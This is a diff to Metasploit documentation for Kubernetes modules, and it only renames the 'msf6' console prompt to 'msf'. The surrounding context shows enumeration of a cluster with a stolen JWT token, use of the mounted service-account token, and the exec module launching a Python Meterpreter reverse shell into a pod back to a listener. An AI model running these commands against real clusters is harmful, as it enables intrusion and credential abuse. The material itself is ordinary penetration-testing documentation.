@@ -9,7 +9,7 @@ a compromised docker container, or external to the cluster if the required APIs 
 In the future there may be more modules than listed here, for the full list of modules run the `search` command within msfconsole:
 
 ```msf
-msf6 > search kubernetes
+msf > search kubernetes
 ```
 
 ### Lab Environment
@@ -41,12 +41,12 @@ run session=-1
 If the Kubernetes API is publicly accessible and you have a JWT Token:
 
 ```msf
-msf6 > use cloud/kubernetes/enum_kubernetes
-msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set RHOST https://kubernetes.docker.internal:6443
+msf > use cloud/kubernetes/enum_kubernetes
+msf auxiliary(cloud/kubernetes/enum_kubernetes) > set RHOST https://kubernetes.docker.internal:6443
 RHOST => https://kubernetes.docker.internal:6443
-msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
+msf auxiliary(cloud/kubernetes/enum_kubernetes) > set TOKEN eyJhbGciO...
 TOKEN => eyJhbGciO...
-msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > run
+msf auxiliary(cloud/kubernetes/enum_kubernetes) > run
 [*] Running module against 127.0.0.1
 
 [+] Kubernetes service version: {"major":"1","minor":"21","gitVersion":"v1.21.2","gitCommit":"092fbfbf53427de67cac1e9fa54aaa09a28371d7","gitTreeState":"clean","buildDate":"2021-06-16T12:53:14Z","goVersion":"go1.16.5","compiler":"gc","platform":"linux/amd64"}
@@ -68,7 +68,7 @@ Namespaces
 By default the `run` command will enumerate all resources available, but you can also specify which actions you would like to perform:
 
 ```msf
-msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > show actions
+msf auxiliary(cloud/kubernetes/enum_kubernetes) > show actions
 
 Auxiliary actions:
 
@@ -115,9 +115,9 @@ If you have a Meterpreter session on a compromised Kubernetes container with the
 will be gathered from the session host automatically. The `TOKEN` will be read from the mounted `/run/secrets/kubernetes.io/serviceaccount/token` file if available:
 
 ```msf
-msf6 exploit(multi/kubernetes/exec) > set TARGET Interactive\ WebSocket
+msf exploit(multi/kubernetes/exec) > set TARGET Interactive\ WebSocket
 TARGET => Interactive WebSocket
-msf6 exploit(multi/kubernetes/exec) > run RHOST="" RPORT="" POD="" SESSION=-1
+msf exploit(multi/kubernetes/exec) > run RHOST="" RPORT="" POD="" SESSION=-1
 
 [*] Routing traffic through session: 1
 [+] Kubernetes service host: 10.96.0.1:443
@@ -137,19 +137,19 @@ pwd
 If the Kubernetes API is available remotely, the RHOST values and token can be set manually. In this scenario a token is manually specified, to execute a Python Meterpreter payload within the `thinkphp-67f7c88cc9-tgpfh` pod:
 
 ```msf
-msf6 > use exploit/multi/kubernetes/exec
+msf > use exploit/multi/kubernetes/exec
 [*] Using configured payload python/meterpreter/reverse_tcp
-msf6 exploit(multi/kubernetes/exec) > set TOKEN eyJhbGciOiJSUzI1...
+msf exploit(multi/kubernetes/exec) > set TOKEN eyJhbGciOiJSUzI1...
 TOKEN => eyJhbGciOiJSUzI1...
-msf6 exploit(multi/kubernetes/exec) > set POD thinkphp-67f7c88cc9-tgpfh
+msf exploit(multi/kubernetes/exec) > set POD thinkphp-67f7c88cc9-tgpfh
 POD => thinkphp-67f7c88cc9-tgpfh
-msf6 exploit(multi/kubernetes/exec) > set RHOSTS 192.168.159.31
+msf exploit(multi/kubernetes/exec) > set RHOSTS 192.168.159.31
 RHOSTS => 192.168.159.31
-msf6 exploit(multi/kubernetes/exec) > set TARGET Python
+msf exploit(multi/kubernetes/exec) > set TARGET Python
 TARGET => Python
-msf6 exploit(multi/kubernetes/exec) > set PAYLOAD python/meterpreter/reverse_tcp
+msf exploit(multi/kubernetes/exec) > set PAYLOAD python/meterpreter/reverse_tcp
 PAYLOAD => python/meterpreter/reverse_tcp
-msf6 exploit(multi/kubernetes/exec) > run
+msf exploit(multi/kubernetes/exec) > run
 
 [*] Started reverse TCP handler on 192.168.159.128:4444
 [*] Sending stage (39736 bytes) to 192.168.159.31
@@ -164,5 +164,5 @@ Architecture : x64
 Meterpreter  : python/linux
 meterpreter > background
 [*] Backgrounding session 1...
-msf6 exploit(multi/kubernetes/exec) >
+msf exploit(multi/kubernetes/exec) >
 ```
